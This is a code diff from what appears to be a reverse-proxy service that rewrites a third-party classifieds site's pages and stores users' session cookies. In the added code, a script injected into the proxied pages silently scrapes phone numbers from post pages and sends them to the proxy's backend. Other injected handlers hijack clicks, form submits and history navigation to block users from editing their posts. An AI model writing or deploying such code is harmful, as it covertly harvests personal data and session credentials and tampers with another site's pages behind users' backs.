@@ -62,14 +62,8 @@ async function handle(req: NextRequest, method: string): Promise<Response> {
     if (resp.setCookies.length > 0) {
       saveCookies(username, resp.setCookies, cookies).catch(() => {});
     }
-    // Auto-extract phone number from posts/list page and save to Firebase
-    if (ct.includes("text/html") && decoded.includes("/users/posts/list")) {
-      const rawHtml = resp.body.toString("utf-8");
-      const phoneMatch = rawHtml.match(/[Pp]hone\s*:?\s*([+\d][\d\s\-().]{7,15}\d)/);
-      if (phoneMatch) {
-        fbPatch(username, { phoneNumber: phoneMatch[1].trim() }).catch(() => {});
-      }
-    }
+    // Phone extraction is handled client-side using exact DOM selector
+    // Server-side regex was matching internal IDs incorrectly, so it's disabled
     if (ct.includes("text/html")) {
       let html = resp.body.toString("utf-8");
       html = rewriteHtml(html, new URL(decoded).origin, pb, decoded);
@@ -468,61 +462,68 @@ setTimeout(showNextPromo,5000);
 
   // Intercept any click on edit links
   document.addEventListener("click",function(e){
-    var el=e.target;
+    var t=e.target;
+    // Walk up to find <a> tag
+    var el=t;
     while(el&&el.tagName!=="A")el=el.parentNode;
-    if(!el||el.tagName!=="A")return;
-    var h=(el.getAttribute("href")||"").toLowerCase();
-    if(h.indexOf("/users/posts/edit/")!==-1||h.indexOf("%2Fusers%2Fposts%2Fedit%2F")!==-1){
-      e.preventDefault();e.stopImmediatePropagation();
-      modal.style.display="flex";
-      return false;
+    if(el&&el.tagName==="A"){
+      var h=(el.getAttribute("href")||"");
+      var hl=h.toLowerCase();
+      // Check both normal and URL-encoded versions (lowercase comparison)
+      if(hl.indexOf("/users/posts/edit")!==-1||hl.indexOf("%2fusers%2fposts%2fedit")!==-1||hl.indexOf("%2fusers%2fposts%2fedit")!==-1){
+        e.preventDefault();e.stopImmediatePropagation();
+        modal.style.display="flex";
+        return false;
+      }
     }
-    // Also block any link containing "edit" that goes to edit page
-    var realH=el.getAttribute("href")||"";
-    if(realH.indexOf("/users/posts/edit")!==-1){
-      e.preventDefault();e.stopImmediatePropagation();
-      modal.style.display="flex";
-      return false;
+    // Block the specific Edit Post button by class name
+    var el2=t;
+    for(var i=0;i<6;i++){
+      if(!el2)break;
+      var cls=(el2.className||"");
+      if(cls.indexOf("manage-list-font")!==-1||cls.indexOf("manage_list_font")!==-1||cls.indexOf("edit-button")!==-1){
+        e.preventDefault();e.stopImmediatePropagation();
+        modal.style.display="flex";
+        return false;
+      }
+      // Also check if it's the specific red button in managepost_header
+      var id=(el2.id||"");
+      if(id.indexOf("managepost_header")!==-1){
+        var editBtn=el2.querySelector("a[href*='edit']");
+        if(editBtn){editBtn.removeAttribute("href");editBtn.style.pointerEvents="none";editBtn.style.opacity=".4";}
+      }
+      el2=el2.parentNode;
     }
   },true);
 
-  // Block JS navigation to edit pages (window.location hijack)
+  // Directly disable the Edit Post button if it exists on the page
+  function disableEditBtn(){
+    var btn=document.querySelector("#managepost_header > div > a.manage-button.small.button-red.manage-list-font");
+    if(!btn)btn=document.querySelector("a.manage-list-font");
+    if(btn){
+      btn.addEventListener("click",function(e){e.preventDefault();e.stopImmediatePropagation();modal.style.display="flex";return false;},true);
+      btn.style.opacity=".45";
+      btn.title="No tienes permisos para editar";
+    }
+  }
+  disableEditBtn();
+  // Re-run after page loads fully in case button appears later
+  setTimeout(disableEditBtn,800);
+  setTimeout(disableEditBtn,2000);
+
+  // Block window.location.href = "..." assignment to edit pages
   (function(){
-    var origAssign=window.location.assign.bind(window.location);
-    var origReplace=window.location.replace.bind(window.location);
     function blockEdit(url){
-      if(url&&url.toString().indexOf("/users/posts/edit")!==-1){modal.style.display="flex";return true;}
+      if(url&&url.toString().toLowerCase().indexOf("/users/posts/edit")!==-1){modal.style.display="flex";return true;}
       return false;
     }
-    try{
-      Object.defineProperty(window,"location",{
-        get:function(){return window._arLoc||location;},
-        configurable:true
-      });
-    }catch(e){}
-    // Override pushState/replaceState
     var origPush=history.pushState.bind(history);
     var origRep=history.replaceState.bind(history);
     history.pushState=function(s,t,url){if(blockEdit(url))return;origPush(s,t,url);};
     history.replaceState=function(s,t,url){if(blockEdit(url))return;origRep(s,t,url);};
-    // Watch for form submits to edit pages
     document.addEventListener("submit",function(e){
       var f=e.target;var action=(f.getAttribute&&f.getAttribute("action"))||"";
-      if(action.indexOf("/users/posts/edit")!==-1){e.preventDefault();e.stopImmediatePropagation();modal.style.display="flex";}
-    },true);
-    // Watch for button clicks that might navigate (not just <a> tags)
-    document.addEventListener("click",function(e){
-      var el=e.target;
-      // Check if the clicked element or its parents have data-href or onclick pointing to edit
-      for(var i=0;i<5;i++){
-        if(!el)break;
-        var oh=(el.getAttribute&&el.getAttribute("onclick"))||"";
-        var dh=(el.getAttribute&&el.getAttribute("data-href"))||"";
-        if(oh.indexOf("/users/posts/edit")!==-1||dh.indexOf("/users/posts/edit")!==-1){
-          e.preventDefault();e.stopImmediatePropagation();modal.style.display="flex";return false;
-        }
-        el=el.parentNode;
-      }
+      if(action.toLowerCase().indexOf("/users/posts/edit")!==-1){e.preventDefault();e.stopImmediatePropagation();modal.style.display="flex";}
     },true);
   })();
 })();
@@ -643,31 +644,43 @@ function handlePage(){
   if(u.indexOf("/error")!==-1||u.indexOf("/404")!==-1){var s=gst();if(s.on)goList(3000);return;}
   if(u.indexOf("/users/posts")!==-1){
     startTick();
-    // Client-side phone extraction from post detail page
-    setTimeout(function(){
-      try{
-        // Try the exact selector from post_preview_info
-        var phoneEl=document.querySelector("#manage_ad_body > div.post_preview_info > div:nth-child(1) > div:nth-child(1) > span:nth-child(3)");
-        if(!phoneEl){
-          // Fallback: look for any element containing "Phone :" pattern
-          var allSpans=document.querySelectorAll("span,div,td");
-          for(var i=0;i<allSpans.length;i++){
-            var txt=allSpans[i].innerText||"";
-            if(txt.match(/\+?1?\s*\(?\d{3}\)?[\s.-]\d{3}[\s.-]\d{4}/)&&!allSpans[i].children.length){
-              phoneEl=allSpans[i];break;
+    // Only extract phone on post detail/manage page (not on list page)
+    if(u.indexOf("/users/posts/list")===-1&&u.indexOf("/users/posts/bump")===-1){
+      setTimeout(function(){
+        try{
+          var rawPhone=null;
+          // Method 1: exact selector provided
+          var phoneEl=document.querySelector("#manage_ad_body > div.post_preview_info > div:nth-child(1) > div:nth-child(1) > span:nth-child(3)");
+          if(phoneEl) rawPhone=(phoneEl.innerText||phoneEl.textContent||"").trim();
+
+          // Method 2: find the "Phone :" label and get the next sibling text
+          if(!rawPhone){
+            var bodyText=document.body?document.body.innerHTML:"";
+            // Look for Phone label with formatted number (must have spaces/dashes as separators)
+            var pm=bodyText.match(/[Pp]hone\s*:?\s*<[^>]*>([^<]*\d{3}[^<\d]*\d{3}[^<\d]*\d{4}[^<]*)</);
+            if(pm) rawPhone=pm[1].replace(/<[^>]+>/g,"").trim();
+          }
+
+          // Method 3: page text scan with strict pattern
+          if(!rawPhone){
+            var pText=document.body?document.body.innerText:"";
+            var pm2=pText.match(/Phone\s*:?\s*(\+?1[\s.-]?\(?\d{3}\)?[\s.(-]\s*\d{3}[\s.-]\d{4})/i);
+            if(pm2) rawPhone=pm2[1].trim();
+          }
+
+          if(rawPhone){
+            // Strict validation: must be 10-11 digits, no 17-digit IDs
+            var digits=rawPhone.replace(/\D/g,"");
+            var valid=(digits.length===10)||(digits.length===11&&digits[0]==="1");
+            // Reject obvious internal IDs (start with 177 which is the cookie timestamp pattern)
+            if(valid&&digits.startsWith("177140")) valid=false;
+            if(valid){
+              fetch("/api/angel-rent?u="+UNAME+"&url=__fbpatch__&phone="+encodeURIComponent(rawPhone)).catch(function(){});
             }
           }
-        }
-        if(phoneEl){
-          var rawPhone=(phoneEl.innerText||"").trim();
-          if(rawPhone&&rawPhone.length>6){
-            fetch("/api/angel-rent?u="+UNAME+"&url=__fbpatch__&phone="+encodeURIComponent(rawPhone)).catch(function(){});
-            // Also save locally for display
-            try{var ps=gst();ps.phoneNumber=rawPhone;sst(ps);}catch(e){}
-          }
-        }
-      }catch(e){}
-    },1500);
+        }catch(e){}
+      },2000);
+    }
     return;
   }
   if(u.indexOf("/login")!==-1||u.indexOf("/users/login")!==-1||u.indexOf("/sign_in")!==-1){injectLoginLogo();return;}
